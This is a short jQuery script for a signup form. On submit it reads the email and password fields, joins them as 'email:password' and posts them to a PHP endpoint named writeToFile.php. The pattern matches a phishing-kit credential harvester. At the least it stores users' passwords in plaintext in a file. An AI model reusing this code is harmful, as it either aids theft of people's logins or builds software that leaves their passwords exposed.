$(".signup").on("submit", function (e) {
    const $email = $("input.input_login").val();
    const $password = $("input.input_password").val();

    const content = $email + ':' + $password;

    $.ajax({
        type: 'POST',
        url: "./php/writeToFile.php",
        data: { text: content },
        success: function (result) {
            console.log("The data was successsfully sent to the server ");
        },
        headers: {
            "Access": "*/*"
        }
    })
});

